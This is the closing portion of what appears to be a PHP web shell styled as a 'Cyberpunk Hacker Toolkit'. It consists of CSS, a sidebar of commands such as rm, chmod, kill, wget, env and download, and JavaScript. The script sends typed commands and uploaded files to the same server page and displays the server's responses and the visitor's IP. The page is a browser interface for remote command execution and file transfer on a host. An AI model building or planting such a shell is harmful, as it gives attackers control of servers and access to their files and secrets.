        .btn {
            background: linear-gradient(135deg,
                rgba(255, 0, 51, 0.2) 0%,
                rgba(255, 0, 51, 0.1) 100%);
            color: var(--cyber-red);
            border: 1px solid transparent;
            border-image: linear-gradient(135deg, var(--cyber-red), var(--cyber-blue)) 1;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Share Tech Mono', monospace;
            font-size: 11px;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            box-shadow:
                0 4px 15px rgba(255, 0, 51, 0.2),
                inset 0 0 20px rgba(255, 0, 51, 0.1);
        }

        .btn:hover {
            background: linear-gradient(135deg,
                rgba(255, 0, 51, 0.4) 0%,
                rgba(255, 0, 51, 0.2) 100%);
            transform: translateY(-3px) scale(1.05);
            box-shadow:
                0 8px 25px rgba(255, 0, 51, 0.4),
                inset 0 0 30px rgba(255, 0, 51, 0.2);
        }

        .terminal {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            background: linear-gradient(135deg,
                rgba(15, 15, 25, 0.7) 0%,
                rgba(255, 0, 51, 0.1) 50%,
                rgba(15, 15, 25, 0.7) 100%);
            padding: 20px;
            border-radius: 15px;
            border: 2px solid transparent;
            border-image: linear-gradient(135deg, var(--cyber-red), var(--cyber-blue), var(--cyber-purple)) 1;
            backdrop-filter: blur(25px) saturate(180%);
            -webkit-backdrop-filter: blur(25px) saturate(180%);
            overflow: hidden;
            position: relative;
            box-shadow:
                inset 0 0 100px rgba(255, 0, 51, 0.1),
                0 0 50px rgba(255, 0, 51, 0.2),
                0 8px 32px rgba(0, 0, 0, 0.3);
            animation: terminalGlow 8s ease-in-out infinite alternate;
        }

        @keyframes terminalGlow {
            0% {
                box-shadow:
                    inset 0 0 100px rgba(255, 0, 51, 0.1),
                    0 0 50px rgba(255, 0, 51, 0.2),
                    0 8px 32px rgba(0, 0, 0, 0.3);
            }
            50% {
                box-shadow:
                    inset 0 0 150px rgba(255, 0, 51, 0.2),
                    0 0 80px rgba(255, 0, 51, 0.3),
                    0 8px 32px rgba(0, 0, 0, 0.4);
            }
            100% {
                box-shadow:
                    inset 0 0 120px rgba(255, 0, 51, 0.15),
                    0 0 60px rgba(255, 0, 51, 0.25),
                    0 8px 32px rgba(0, 0, 0, 0.35);
            }
        }

        #output {
            white-space: pre-wrap;
            background: linear-gradient(135deg,
                rgba(5, 5, 15, 0.6) 0%,
                rgba(255, 0, 51, 0.05) 50%,
                rgba(5, 5, 15, 0.6) 100%);
            color: #f0f0f0;
            padding: 15px;
            margin-bottom: 15px;
            border: 1px solid transparent;
            border-image: linear-gradient(135deg, var(--cyber-red), var(--cyber-blue)) 1;
            border-radius: 10px;
            height: 400px;
            overflow-y: auto;
            font-family: 'Share Tech Mono', monospace;
            font-size: 13px;
            line-height: 1.4;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            box-shadow:
                inset 0 0 30px rgba(255, 0, 51, 0.1),
                0 2px 10px rgba(0, 0, 0, 0.2);
        }

        #output .success {
            color: var(--cyber-green);
        }

        #output .error {
            color: #ff4444;
        }

        #output .info {
            color: var(--cyber-blue);
        }

        .input-area {
            display: flex;
            flex-direction: row;
            gap: 15px;
        }

        .command-input {
            display: flex;
            flex: 1;
            gap: 10px;
        }

        .prompt {
            color: var(--cyber-red);
            font-family: 'Share Tech Mono', monospace;
            font-weight: bold;
            padding: 10px;
            background: linear-gradient(135deg,
                rgba(5, 5, 15, 0.7) 0%,
                rgba(255, 0, 51, 0.1) 100%);
            border: 1px solid transparent;
            border-image: linear-gradient(135deg, var(--cyber-red), var(--cyber-blue)) 1;
            border-radius: 10px 0 0 10px;
            display: flex;
            align-items: center;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            box-shadow: inset 0 0 20px rgba(255, 0, 51, 0.1);
        }

        input[type="text"] {
            flex-grow: 1;
            background: linear-gradient(135deg,
                rgba(5, 5, 15, 0.7) 0%,
                rgba(255, 0, 51, 0.05) 100%);
            color: #f0f0f0;
            border: 1px solid transparent;
            border-image: linear-gradient(135deg, var(--cyber-red), var(--cyber-blue)) 1;
            padding: 10px 15px;
            border-radius: 0 10px 10px 0;
            font-family: 'Share Tech Mono', monospace;
            font-size: 13px;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }

        input[type="text"]:focus {
            outline: none;
            background: linear-gradient(135deg,
                rgba(5, 5, 15, 0.8) 0%,
                rgba(255, 0, 51, 0.15) 100%);
            box-shadow:
                0 0 20px rgba(255, 0, 51, 0.4),
                inset 0 0 20px rgba(255, 0, 51, 0.1);
            transform: scale(1.02);
        }

        .upload-section {
            display: flex;
            flex: 1;
            gap: 10px;
            align-items: center;
        }

        .upload-section input[type="file"] {
            flex-grow: 1;
            background: linear-gradient(135deg,
                rgba(5, 5, 15, 0.7) 0%,
                rgba(255, 0, 51, 0.05) 100%);
            color: #f0f0f0;
            border: 1px solid transparent;
            border-image: linear-gradient(135deg, var(--cyber-red), var(--cyber-blue)) 1;
            padding: 10px 15px;
            border-radius: 10px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 12px;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }

        .upload-section input[type="file"]:hover {
            background: linear-gradient(135deg,
                rgba(5, 5, 15, 0.8) 0%,
                rgba(255, 0, 51, 0.1) 100%);
            transform: scale(1.02);
        }

        .upload-section input[type="submit"] {
            background: linear-gradient(135deg, var(--cyber-red), var(--cyber-red-light));
            color: #000;
            border: 1px solid transparent;
            border-image: linear-gradient(135deg, var(--cyber-red), var(--cyber-blue)) 1;
            padding: 10px 15px;
            cursor: pointer;
            border-radius: 10px;
            font-weight: 600;
            transition: all 0.3s ease;
            font-family: 'Share Tech Mono', monospace;
            font-size: 12px;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            box-shadow: 0 4px 15px rgba(255, 0, 51, 0.3);
        }

        .upload-section input[type="submit"]:hover {
            transform: translateY(-3px) scale(1.05);
            box-shadow:
                0 8px 25px rgba(255, 0, 51, 0.5),
                inset 0 0 20px rgba(255, 0, 51, 0.1);
        }

        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            font-size: 11px;
            color: var(--cyber-gray-light);
            border-top: 1px solid transparent;
            border-image: linear-gradient(135deg, var(--cyber-red), var(--cyber-blue)) 1;
            background: linear-gradient(135deg,
                rgba(5, 5, 15, 0.5) 0%,
                rgba(255, 0, 51, 0.05) 100%);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-radius: 0 0 15px 15px;
            margin: 0 -20px -20px -20px;
        }

        @media (max-width: 768px) {
            body {
                flex-direction: column;
            }
            
            .sidebar {
                width: 100%;
                height: auto;
                max-height: 300px;
            }
            
            .input-area {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="grid-overlay"></div>
    
    <div class="sidebar">
        <div class="sidebar-header">
            <h1><i class="fas fa-terminal"></i> CYBERPUNK HACKER TOOLKIT</h1>
            <p>ADVANCED CYBER SECURITY SYSTEM v3.0</p>
        </div>
        
        <div class="sidebar-section">
            <h2><i class="fas fa-folder"></i> FILE COMMANDS</h2>
            <ul>
                <li><span class="command">ls</span> <span class="desc">List directory contents</span></li>
                <li><span class="command">pwd</span> <span class="desc">Print working directory</span></li>
                <li><span class="command">cd [dir]</span> <span class="desc">Change directory</span></li>
                <li><span class="command">touch [file]</span> <span class="desc">Create new file</span></li>
                <li><span class="command">rm [file]</span> <span class="desc">Remove file/directory</span></li>
                <li><span class="command">mkdir [dir]</span> <span class="desc">Create directory</span></li>
                <li><span class="command">rmdir [dir]</span> <span class="desc">Remove directory</span></li>
                <li><span class="command">cat [file]</span> <span class="desc">Display file contents</span></li>
            </ul>
        </div>
        
        <div class="sidebar-section">
            <h2><i class="fas fa-cogs"></i> ADVANCED COMMANDS</h2>
            <ul>
                <li><span class="command">cp [src] [dst]</span> <span class="desc">Copy file</span></li>
                <li><span class="command">mv [src] [dst]</span> <span class="desc">Move/rename file</span></li>
                <li><span class="command">chmod [mode] [file]</span> <span class="desc">Change permissions</span></li>
                <li><span class="command">find [term]</span> <span class="desc">Search for files</span></li>
            </ul>
        </div>
        
        <div class="sidebar-section">
            <h2><i class="fas fa-search"></i> TEXT PROCESSING</h2>
            <ul>
                <li><span class="command">grep [pattern] [file]</span> <span class="desc">Search text in files</span></li>
                <li><span class="command">head [lines] [file]</span> <span class="desc">Show first lines</span></li>
                <li><span class="command">tail [lines] [file]</span> <span class="desc">Show last lines</span></li>
                <li><span class="command">wc [file]</span> <span class="desc">Count words/lines</span></li>
            </ul>
        </div>

        <div class="sidebar-section">
            <h2><i class="fas fa-cog"></i> PROCESS MANAGEMENT</h2>
            <ul>
                <li><span class="command">ps</span> <span class="desc">List processes</span></li>
                <li><span class="command">kill [pid]</span> <span class="desc">Terminate process</span></li>
                <li><span class="command">history</span> <span class="desc">Command history</span></li>
            </ul>
        </div>

        <div class="sidebar-section">
            <h2><i class="fas fa-network-wired"></i> NETWORK TOOLS</h2>
            <ul>
                <li><span class="command">ping [host] [count]</span> <span class="desc">Network connectivity</span></li>
                <li><span class="command">curl [url] [options]</span> <span class="desc">HTTP requests</span></li>
                <li><span class="command">wget [url] [file]</span> <span class="desc">Download files</span></li>
            </ul>
        </div>

        <div class="sidebar-section">
            <h2><i class="fas fa-archive"></i> ARCHIVE TOOLS</h2>
            <ul>
                <li><span class="command">tar [c|x|l] [file]</span> <span class="desc">Tar archives</span></li>
                <li><span class="command">zip [c|x|l] [file]</span> <span class="desc">ZIP archives</span></li>
            </ul>
        </div>

        <div class="sidebar-section">
            <h2><i class="fas fa-cogs"></i> ENVIRONMENT</h2>
            <ul>
                <li><span class="command">env</span> <span class="desc">Environment variables</span></li>
                <li><span class="command">setenv [var] [value]</span> <span class="desc">Set variable</span></li>
                <li><span class="command">getenv [var]</span> <span class="desc">Get variable</span></li>
            </ul>
        </div>

        <div class="sidebar-section">
            <h2><i class="fas fa-download"></i> TRANSFER & SYSTEM</h2>
            <ul>
                <li><span class="command">download [file]</span> <span class="desc">Download file</span></li>
                <li><span class="command">sysinfo</span> <span class="desc">System information</span></li>
                <li><span class="command">network</span> <span class="desc">Network information</span></li>
                <li><span class="command">clear</span> <span class="desc">Clear terminal</span></li>
            </ul>
        </div>
        
        <div class="documentation">
            <p>⚠️ THIS SYSTEM IS RESTRICTED TO AUTHORIZED USERS ONLY. UNAUTHORIZED ACCESS IS PROHIBITED.</p>
        </div>
    </div>
    
    <div class="terminal-container">
        <div class="terminal-header">
            <h2><i class="fas fa-terminal"></i> CYBER TERMINAL</h2>
            <div class="terminal-header-buttons">
                <button id="clear-btn" class="btn"><i class="fas fa-broom"></i> CLEAR</button>
                <button id="help-btn" class="btn"><i class="fas fa-question-circle"></i> HELP</button>
            </div>
        </div>
        
        <div class="terminal">
            <div id="output">CYBERPUNK HACKER TOOLKIT v3.0
ACCESS GRANTED: <?php echo $_SERVER['REMOTE_ADDR']; ?>

CURRENT DIRECTORY: <?php echo getCurrentDirectory(); ?>

>> ENTER COMMAND TO BEGIN <<

</div>
            
            <div class="input-area">
                <div class="command-input">
                    <div class="prompt">CYBER$</div>
                    <input type="text" id="command" name="command" autocomplete="off" autofocus placeholder="ENTER COMMAND...">
                </div>
                <form id="upload-form" method="post" enctype="multipart/form-data" class="upload-section">
                    <input type="file" name="fileToUpload" id="fileToUpload">
                    <input type="submit" value="UPLOAD">
                </form>
            </div>
            
            <div class="status-bar">
                <div>CYBERPUNK HACKER TOOLKIT v3.0</div>
                <div>STATUS: <span style="color: var(--cyber-green);">ACTIVE</span></div>
            </div>
        </div>
    </div>
    
    <script>
        // Command form handling - submit on Enter key
        document.getElementById("command").addEventListener("keydown", function(event) {
            if (event.key === "Enter") {
                event.preventDefault();
                const command = this.value.trim();
                
                if (command === '') return;
                
                if (command === 'help') {
                    displayHelp();
                    this.value = '';
                    return;
                }
                
                if (command === 'clear') {
                    document.getElementById("output").textContent = '';
                    this.value = '';
                    return;
                }
                
                // Create form data and send request
                const formData = new FormData();
                formData.append("command", command);
                
                fetch("<?php echo $_SERVER['PHP_SELF']; ?>", {
                    method: "POST",
                    body: formData,
                })
                .then(response => response.text())
                .then(data => {
                    const output = document.getElementById("output");
                    output.textContent += "CYBER$ " + command + "\n" + data + "\n\n";
                    output.scrollTop = output.scrollHeight;
                    document.getElementById("command").value = '';
                })
                .catch(error => {
                    console.error("Error:", error);
                    const output = document.getElementById("output");
                    output.textContent += "CYBER$ " + command + "\nERROR: " + error + "\n\n";
                    output.scrollTop = output.scrollHeight;
                    document.getElementById("command").value = '';
                });
            }
        });

        document.getElementById("upload-form").addEventListener("submit", function(event) {
            event.preventDefault();
            const formData = new FormData(this);

            fetch("<?php echo $_SERVER['PHP_SELF']; ?>", {
                method: "POST",
                body: formData,
            })
            .then(response => response.text())
            .then(data => {
                const output = document.getElementById("output");
                output.textContent += "UPLOAD: " + data + "\n\n";
                output.scrollTop = output.scrollHeight;
                document.getElementById("fileToUpload").value = '';
            })
            .catch(error => {
                console.error("Error:", error);
                const output = document.getElementById("output");
                output.textContent += "UPLOAD ERROR: " + error + "\n\n";
                output.scrollTop = output.scrollHeight;
                document.getElementById("fileToUpload").value = '';
            });
        });
        
        document.getElementById("clear-btn").addEventListener("click", function() {
            document.getElementById("output").textContent = '';
            document.getElementById("command").focus();
        });
        
        document.getElementById("help-btn").addEventListener("click", function() {
            displayHelp();
        });
        
        function displayHelp() {
            const helpText = `CYBERPUNK HACKER TOOLKIT COMMAND REFERENCE:
FILE COMMANDS:
  ls                    - List directory contents
  pwd                   - Print working directory
  cd [dir]              - Change directory
  touch [file]          - Create new file
  rm [file]             - Remove file/directory
  mkdir [dir]           - Create directory
  rmdir [dir]           - Remove directory
  cat [file]            - Display file contents

ADVANCED COMMANDS:
  cp [src] [dst]        - Copy file
  mv [src] [dst]        - Move/rename file
  chmod [mode] [file]   - Change permissions
  find [term]           - Search for files
  grep [pattern] [file] - Search text in files
  head [lines] [file]   - Show first lines of file
  tail [lines] [file]   - Show last lines of file
  wc [file]             - Count lines, words, characters

PROCESS MANAGEMENT:
  ps                    - List running processes
  kill [pid]            - Terminate process
  history               - Show command history

NETWORK TOOLS:
  ping [host] [count]   - Ping network host
  curl [url] [options]  - HTTP requests
  wget [url] [file]     - Download files

ENVIRONMENT:
  env                   - Show environment variables
  setenv [var] [value]  - Set environment variable
  getenv [var]          - Get environment variable

ARCHIVE TOOLS:
  tar [c|x|l] [file]    - Create/extract/list tar archives
  zip [c|x|l] [file]    - Create/extract/list zip archives

TRANSFER & SYSTEM:
  download [file]       - Download file
  sysinfo               - System information
  network               - Network information
  clear                 - Clear terminal
`;
            const output = document.getElementById("output");
            output.textContent += helpText + "\n";
            output.scrollTop = output.scrollHeight;
        }
        
        // Focus on command input when page loads
        window.addEventListener("load", function() {
            document.getElementById("command").focus();
        });
    </script>
</body>
</html>
